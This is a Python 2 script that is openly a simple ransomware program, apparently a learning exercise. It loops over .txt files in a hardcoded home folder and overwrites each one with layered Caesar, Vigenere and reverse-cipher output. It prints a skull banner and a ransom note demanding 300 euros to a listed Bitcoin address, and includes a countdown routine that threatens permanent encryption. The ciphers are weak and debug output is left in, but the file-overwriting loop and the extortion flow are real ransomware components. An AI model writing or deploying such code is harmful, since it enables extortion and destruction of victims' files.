import math, glob, os
import time
from  caesarCipher import *
from reverseCipher import *
from vigenereCipher import *

def paymentTime(p,q):
	i=p
	j=q
	k=0
	while True:
		if(j == 1):
			j=59
			i -=1
		if(j > 19):
			print "\r"+str(k)+str(i)+":"+str(j)
		else:
			print "\rTIME UP!!! - FILES PERMENTALY ENCRYPTED"
			exit()

		time.sleep(1)
		j -= 1
		if(i == 0 and j == -1):
			break
	if(i == 0 and j== -1):
		print "\rTIME UP!!! - FILES PERMENTALY ENCRYPTED"
		time.sleep(1)


def FileEncryption(file):
	file1 = open(file,'rb')
	fileData = file1.read()
	file1.close()

	instructions = """
	_________________***************__________________
	_____________***________________***_______________
	___________**______________________****___________
	_________**__________________________****_________
	_______***___________________****_______**________
	_******__*************_____***__****************__
	__****____*********_*********____**************___
	___***************___******************____***____
	__*___********______*****************______**__*__
	_**___*********______**************_______**__**__
	*______********_____***___*********___*****____*__
	*__________***********______***********__*______**
	*_______________________________________________**
	*________**_____________________________________**
	*______****_________________________****________**
	*_____*__**_________________________****________**
	*_________***______________________**___________**
	*___________***__________________***____________**
	**____________****____________****_____________*__
	_**______________**************________________*__
	__*___________________________________________**__
	___**________________________________________**___
	____**______________________________________**____
	_____**___________________________________**______
	_______**_______________________________***_______
	_________**___________________________***_________
	__________****_____________________**_____________
	______________****_____________*****______________
	___________________************___________________
	_________________FILES ENCRYPRTED_________________
	Decrypt Instructions:
	Send 300 euros to the following Bitcoin address-
	Address: 1FVKW4rp5rN23dqFVk2tYGY4niAXMB8eZC \n\n"""
	print instructions

	print "-------DEBUG-------\n"
	print ("File text: ", fileData)

	key = 1
	#mode = raw_input('Input a mode - "encrypt or "decrypt": ')

	#paymentTime(0,30)

	paymentDone = "y"
	paymentDone = raw_input("Input 'y' once payment is made ")
	if paymentDone == "y":
		mode = "decrypt"
	else:
		mode = 'encrypt'


	c = caesartranslate(fileData, key, mode) #encrypt file
	c2 = vtranslate(c,str(key), mode)
	c1 = reverse(c2)

	print ('Output from Caesar Cipher\t%s' %c)
	print ('Output from Reverse Cipher\t%s' % c1)
	print ('Output from Vigenere Cipher\t%s' % c2)

	file2 = open(file,'wb')
	file2.write(c1)
	file2.close()

os.chdir("/home/zeta/Folders/security")
for file in glob.glob("*.txt"):
    FileEncryption(file)
